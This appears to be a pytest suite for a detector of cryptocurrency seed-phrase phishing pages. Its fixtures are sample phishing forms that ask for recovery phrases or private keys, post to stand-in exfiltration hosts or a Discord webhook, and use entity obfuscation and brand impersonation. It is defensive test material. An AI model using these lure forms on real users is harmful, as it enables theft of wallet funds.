"""
Unit and Security Regression Tests for Web3 Phishing & BIP-39 Seed-Phrase Detection
(Phase 7.2)

Covers:
- High-risk cases: fake wallet restore (12 words, 24 words, multi-input grids, external exfiltration, brand + seed phrase)
- Benign cases: BIP-39 documentation, educational articles, legitimate wallet docs, dApp connection forms, generic textareas, ordinary passwords
- Adversarial cases: split terminology, HTML entity / Unicode obfuscation, popular Tranco domain hosting malicious collection
"""

import pytest
from unittest.mock import patch, MagicMock, AsyncMock
from app.analyzers.web_security_analyzer import WebSecurityAnalyzer
from app.analyzers.domain_analyzer import DomainAnalyzer
from app.analyzers.url_analyzer import UrlAnalyzer
from app.scoring.risk_engine import RiskAggregationEngine
from app.intelligence.bip39_provider import get_bip39_provider, BIP39Provider


@pytest.fixture
def web_analyzer():
    return WebSecurityAnalyzer()


@pytest.fixture
def domain_analyzer():
    return DomainAnalyzer()


@pytest.fixture
def risk_engine():
    return RiskAggregationEngine()


def _mock_http_response(html_body: str, status_code: int = 200, headers: dict = None):
    """Helper to mock an HTTP response stream for WebSecurityAnalyzer."""
    if headers is None:
        headers = {
            "content-type": "text/html; charset=utf-8",
            "strict-transport-security": "max-age=31536000",
            "content-security-policy": "default-src 'self'",
            "x-frame-options": "DENY",
            "x-content-type-options": "nosniff",
        }
    body_bytes = html_body.encode("utf-8")

    async def mock_stream(chunk_size=16384):
        yield body_bytes

    mock_resp = MagicMock()
    mock_resp.status_code = status_code
    mock_resp.headers = headers
    mock_resp.aiter_bytes = mock_stream

    from contextlib import asynccontextmanager

    @asynccontextmanager
    async def mock_stream_ctx(method, url):
        yield mock_resp

    mock_client = AsyncMock()
    mock_client.stream = mock_stream_ctx
    mock_client.__aenter__.return_value = mock_client
    mock_client.__aexit__.return_value = None
    return mock_client


# ==============================================================================
# 1. High-Risk Phishing Scenarios
# ==============================================================================

@pytest.mark.asyncio
async def test_fake_wallet_restore_12_words_textarea(web_analyzer, risk_engine):
    """Fake wallet restore page requesting 12 recovery words in a textarea."""
    html = """
    <html><body>
      <h2>Restore Web3 Wallet</h2>
      <form action="/api/restore" method="POST">
        <label for="recovery_input">Enter your 12-word secret recovery phrase:</label>
        <textarea id="recovery_input" name="seed_phrase" placeholder="word1 word2 ... word12"></textarea>
        <button type="submit">Import Wallet</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://wallet-recovery-portal.com/restore",
            "wallet-recovery-portal.com",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1
    assert seed_findings[0].severity == "CRITICAL"
    assert seed_findings[0].category == "PHISHING_INDICATOR"
    assert seed_findings[0].evidence["collectionMethod"] == "mnemonic_textarea"


@pytest.mark.asyncio
async def test_fake_wallet_import_24_words_textarea(web_analyzer):
    """Fake wallet import page requesting 24 recovery words in a textarea."""
    html = """
    <html><body>
      <h1>Hardware Wallet Synchronizer</h1>
      <form action="/save" method="POST">
        <p>Please enter your 24 word mnemonic recovery phrase to verify ownership.</p>
        <textarea name="mnemonic" placeholder="Enter all 24 words separated by spaces"></textarea>
        <input type="submit" value="Verify Device"/>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://trezor-sync-service.net/verify",
            "trezor-sync-service.net",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1
    assert seed_findings[0].severity == "CRITICAL"


@pytest.mark.asyncio
async def test_multiple_mnemonic_inputs_grid_external_endpoint(web_analyzer):
    """Multiple mnemonic inputs (12 individual words) submitted to external endpoint."""
    inputs_html = "".join([f'<input type="text" name="word_{i}" placeholder="Word #{i}">' for i in range(1, 13)])
    html = f"""
    <html><body>
      <form action="http://attacker-exfil.xyz/collect" method="POST">
        <h3>Enter 12 Mnemonic Words</h3>
        {inputs_html}
        <button type="submit">Confirm</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://defi-airdrop-checker.org/claim",
            "defi-airdrop-checker.org",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1
    assert seed_findings[0].evidence["collectionMethod"] == "multi_input_grid"

    # External host submission finding
    ext_findings = [f for f in findings if f.title == "Credential Form Submits to External Host"]
    assert len(ext_findings) == 1
    assert ext_findings[0].severity == "CRITICAL"

    # Insecure plain HTTP finding
    http_findings = [f for f in findings if f.title == "Insecure Form Submission (HTTP)"]
    assert len(http_findings) == 1


@pytest.mark.asyncio
async def test_private_key_harvesting_form(web_analyzer):
    """Form requesting a raw wallet private key or keystore."""
    html = """
    <html><body>
      <form action="/export" method="POST">
        <label>Enter Ethereum Private Key (64 hex characters):</label>
        <input type="password" name="private_key" placeholder="0x...">
        <button type="submit">Unlock</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://instant-swap-tool.com/key",
            "instant-swap-tool.com",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1


@pytest.mark.asyncio
async def test_brand_impersonation_combined_with_seed_phrase(web_analyzer, domain_analyzer, risk_engine):
    """Trezor brand impersonation combined with seed-phrase harvesting reaches MALICIOUS (>=70)."""
    dom_findings = domain_analyzer.analyze("trezor-suite-hardware-sync.vip")
    brand_findings = [f for f in dom_findings if "Trezor" in f.title]
    assert len(brand_findings) == 1
    assert brand_findings[0].severity == "CRITICAL"

    html = """
    <html><body>
      <form action="http://malicious-exfiltrate.xyz/post.php" method="POST">
        <textarea name="seed_phrase" placeholder="Enter your 12 or 24 word mnemonic recovery phrase"></textarea>
        <button type="submit">Verify Now</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        web_findings, _ = await web_analyzer.analyze(
            "https://trezor-suite-hardware-sync.vip/verify",
            "trezor-suite-hardware-sync.vip",
            pinned_ip="93.184.216.34"
        )

    all_findings = dom_findings + web_findings
    score, verdict, conf, _, _, factors, _, _ = risk_engine.evaluate(
        findings=all_findings,
        analyzer_statuses={"domainAnalyzer": "SUCCESS", "webSecurityAnalyzer": "SUCCESS"}
    )
    assert verdict == "MALICIOUS"
    assert score >= 70


# ==============================================================================
# 2. Benign Educational & Legitimate Cases
# ==============================================================================

@pytest.mark.asyncio
async def test_bip39_educational_documentation_article(web_analyzer, risk_engine):
    """Educational article discussing BIP-39 wordlists without any interactive form."""
    html = """
    <html><body>
      <article>
        <h1>Understanding BIP-39 Mnemonic Seed Phrases</h1>
        <p>BIP-39 specifies a mnemonic code or sentence for the generation of deterministic keys.</p>
        <p>Standard seed phrases consist of 12 or 24 words chosen from a fixed dictionary of 2048 words.</p>
        <p>Example words include: abandon, ability, able, about, above, absent, absorb, abstract.</p>
        <p>Never share your seed phrase with anyone!</p>
      </article>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://learn-crypto-security.org/bip39-explained",
            "learn-crypto-security.org",
            pinned_ip="93.184.216.34"
        )

    # Must NOT emit any PHISHING_INDICATOR findings
    phishing_findings = [f for f in findings if f.category == "PHISHING_INDICATOR"]
    assert len(phishing_findings) == 0

    # Emits only informational reference note (severity INFO = 0 pts)
    info_findings = [f for f in findings if f.title == "BIP-39 Mnemonic Reference Content Observed"]
    assert len(info_findings) == 1
    assert info_findings[0].severity == "INFO"

    score, verdict, _, _, _, _, _, _ = risk_engine.evaluate(
        findings=findings,
        analyzer_statuses={
            "urlAnalyzer": "SUCCESS",
            "domainAnalyzer": "SUCCESS",
            "tlsAnalyzer": "SUCCESS",
            "webSecurityAnalyzer": "SUCCESS",
            "reputationAnalyzer": "SUCCESS",
        }
    )
    assert verdict == "BENIGN"
    assert score <= 15


@pytest.mark.asyncio
async def test_readonly_example_seed_phrase_in_tutorial(web_analyzer, risk_engine):
    """Tutorial displaying a dummy example in a readonly textarea must NOT trigger harvesting."""
    html = """
    <html><body>
      <div class="tutorial-box">
        <h3>Sample BIP-39 Test Vector (DO NOT USE IN PRODUCTION)</h3>
        <form>
          <textarea readonly disabled>abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about</textarea>
        </form>
      </div>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://developer.bitcoin.org/bip39-tutorial",
            "developer.bitcoin.org",
            pinned_ip="93.184.216.34"
        )

    phishing_findings = [f for f in findings if f.category == "PHISHING_INDICATOR"]
    assert len(phishing_findings) == 0


@pytest.mark.asyncio
async def test_legitimate_wallet_connection_page(web_analyzer, risk_engine):
    """Legitimate dApp wallet connect interface (no recovery phrase requested)."""
    html = """
    <html><body>
      <nav><button id="connect-wallet-btn">Connect Wallet</button></nav>
      <main>
        <h2>Swap Tokens Instantly</h2>
        <form id="swap-form">
          <input type="number" name="amountIn" placeholder="0.0">
          <button type="button" onclick="executeSwap()">Swap</button>
        </form>
      </main>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://uniswap.org/swap",
            "uniswap.org",
            pinned_ip="93.184.216.34"
        )

    phishing_findings = [f for f in findings if f.category == "PHISHING_INDICATOR"]
    assert len(phishing_findings) == 0


@pytest.mark.asyncio
async def test_generic_user_comment_textarea(web_analyzer, risk_engine):
    """Generic blog comment or support contact form using a textarea."""
    html = """
    <html><body>
      <h2>Leave a Comment</h2>
      <form action="/comment" method="POST">
        <input type="text" name="author" placeholder="Your Name">
        <textarea name="comment_body" placeholder="Share your thoughts on this article..."></textarea>
        <button type="submit">Submit Comment</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://techblog.com/post/123",
            "techblog.com",
            pinned_ip="93.184.216.34"
        )

    phishing_findings = [f for f in findings if f.category == "PHISHING_INDICATOR"]
    assert len(phishing_findings) == 0


@pytest.mark.asyncio
async def test_ordinary_account_password_form(web_analyzer):
    """Ordinary web login form (standard password field, not a seed phrase)."""
    html = """
    <html><body>
      <h2>Login to Your Account</h2>
      <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Log In</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://app.saas-platform.com/login",
            "app.saas-platform.com",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 0


# ==============================================================================
# 3. Adversarial Evasion & Tranco Popularity Invariants
# ==============================================================================

@pytest.mark.asyncio
async def test_obfuscated_html_entities_seed_phrase(web_analyzer):
    """HTML entity obfuscation (e.g. &#115;eed phrase) is decoded and caught."""
    html = """
    <html><body>
      <form action="/verify" method="POST">
        <textarea name="&#115;eed_phrase" placeholder="Enter &#109;nemonic 12 or 24 word recovery phrase"></textarea>
        <button type="submit">Submit</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://obfuscated-recovery.xyz/auth",
            "obfuscated-recovery.xyz",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1


@pytest.mark.asyncio
async def test_split_terminology_across_elements(web_analyzer):
    """Terminology split across span elements within the form is stitched and recognized."""
    html = """
    <html><body>
      <form action="/sync" method="POST">
        <p><span>Enter</span> <span>your</span> <span>12 or 24</span> <span>word</span> <span>mnemonic</span> <span>recovery</span> <span>phrase</span></p>
        <textarea name="words"></textarea>
        <button type="submit">Sync</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://split-phrase-trap.com/sync",
            "split-phrase-trap.com",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1


@pytest.mark.asyncio
async def test_popular_tranco_domain_with_malicious_seed_phrase_collection(web_analyzer, risk_engine):
    """
    A compromised or exploited popular domain hosting a seed-phrase harvesting form
    MUST NOT be shielded by popularity — web security findings still trigger MALICIOUS.
    """
    html = """
    <html><body>
      <h2>Compromised Portal</h2>
      <form action="http://malicious-exfiltrate.xyz/post.php" method="POST">
        <textarea name="seed_phrase" placeholder="Enter your 12 or 24 word mnemonic recovery phrase"></textarea>
        <button type="submit">Verify</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://wordpress.org/compromised-page",
            "wordpress.org",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1
    assert seed_findings[0].severity == "CRITICAL"

    ext_findings = [f for f in findings if f.title == "Credential Form Submits to External Host"]
    assert len(ext_findings) == 1
    assert ext_findings[0].severity == "CRITICAL"

    score, verdict, _, _, _, _, _, _ = risk_engine.evaluate(
        findings=findings,
        analyzer_statuses={"webSecurityAnalyzer": "SUCCESS"}
    )
    assert verdict == "MALICIOUS"
    assert score >= 70


def test_bip39_provider_integrity():
    """Validates the BIP-39 provider integrity, word count, and canary checks."""
    provider = get_bip39_provider()
    meta = provider.get_metadata()
    assert meta["totalWords"] == 2048
    assert not meta["isDegraded"]
    assert provider.is_bip39_word("abandon")
    assert provider.is_bip39_word("zoo")
    assert not provider.is_bip39_word("notabipword123")


def test_bip39_provider_mnemonic_validation():
    """Validates BIP-39 mnemonic candidate detection."""
    provider = get_bip39_provider()
    valid_12 = "abandon ability able about above absent absorb abstract absurd abuse access accident".split()
    assert provider.is_valid_mnemonic_candidate(valid_12)

    valid_24 = ("abandon " * 24).split()
    assert provider.is_valid_mnemonic_candidate(valid_24)

    invalid_length = ("abandon " * 10).split()
    assert not provider.is_valid_mnemonic_candidate(invalid_length)

    non_bip_words = ("antigravity " * 12).split()
    assert not provider.is_valid_mnemonic_candidate(non_bip_words)


@pytest.mark.asyncio
async def test_educational_wordlist_density_no_form(web_analyzer, risk_engine):
    """Article displaying a large table of BIP-39 words without any interactive form."""
    words = "abandon ability able about above absent absorb abstract absurd abuse access accident"
    html = f"""
    <html><body>
      <main>
        <h1>BIP-39 Wordlist Reference</h1>
        <p>The English wordlist contains 2048 words. Here are the first 12 words:</p>
        <ol>
          {''.join(f'<li>{w}</li>' for w in words.split())}
        </ol>
      </main>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://bip39-reference.org/words",
            "bip39-reference.org",
            pinned_ip="93.184.216.34"
        )

    phishing = [f for f in findings if f.category == "PHISHING_INDICATOR"]
    assert len(phishing) == 0

    score, verdict, _, _, _, _, _, _ = risk_engine.evaluate(
        findings=findings,
        analyzer_statuses={
            "urlAnalyzer": "SUCCESS", "domainAnalyzer": "SUCCESS",
            "tlsAnalyzer": "SUCCESS", "webSecurityAnalyzer": "SUCCESS",
            "reputationAnalyzer": "SUCCESS"
        }
    )
    assert verdict == "BENIGN"
    assert score <= 15


@pytest.mark.asyncio
async def test_legitimate_wallet_backup_guidance(web_analyzer, risk_engine):
    """Security article teaching users how to safely store seed phrases."""
    html = """
    <html><body>
      <article>
        <h2>Best Practices for Securing Your Recovery Phrase</h2>
        <p>Always write down your 12-word seed phrase on paper or stamp it into metal.</p>
        <p>Never take a screenshot or store it in cloud storage.</p>
        <p>Legitimate wallet support will NEVER ask for your recovery phrase.</p>
      </article>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://crypto-safety-guidelines.io/backup",
            "crypto-safety-guidelines.io",
            pinned_ip="93.184.216.34"
        )

    phishing = [f for f in findings if f.category == "PHISHING_INDICATOR"]
    assert len(phishing) == 0


@pytest.mark.asyncio
async def test_security_research_page_describing_phishing(web_analyzer, risk_engine):
    """Security research write-up analyzing a cryptocurrency phishing campaign."""
    html = """
    <html><body>
      <article>
        <h2>Analysis of Web3 Seed Phrase Stealers in the Wild</h2>
        <p>In this post, we analyze a phishing kit that impersonated MetaMask and Ledger.</p>
        <p>The kit presented a fake 24-word recovery phrase textarea posting to a Telegram bot.</p>
      </article>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://threat-research-lab.com/report/seed-stealers",
            "threat-research-lab.com",
            pinned_ip="93.184.216.34"
        )

    phishing = [f for f in findings if f.category == "PHISHING_INDICATOR"]
    assert len(phishing) == 0


@pytest.mark.asyncio
async def test_form_exfiltration_via_webhook(web_analyzer):
    """Seed-phrase collection form exfiltrating to Discord webhook."""
    html = """
    <html><body>
      <form action="https://discord.com/api/webhooks/123456/abcdef" method="POST">
        <textarea name="secret_phrase" placeholder="Enter your 12 word backup phrase"></textarea>
        <button type="submit">Recover</button>
      </form>
    </body></html>
    """
    mock_client = _mock_http_response(html)
    with patch("httpx.AsyncClient", return_value=mock_client):
        findings, _ = await web_analyzer.analyze(
            "https://discord-exfil-lure.xyz/wallet",
            "discord-exfil-lure.xyz",
            pinned_ip="93.184.216.34"
        )

    seed_findings = [f for f in findings if f.title == "Cryptocurrency Wallet Seed-Phrase Harvesting Form Detected"]
    assert len(seed_findings) == 1

    webhook_findings = [f for f in findings if f.title == "Form Exfiltrates Data to Third-Party Webhook / Messaging API"]
    assert len(webhook_findings) == 1

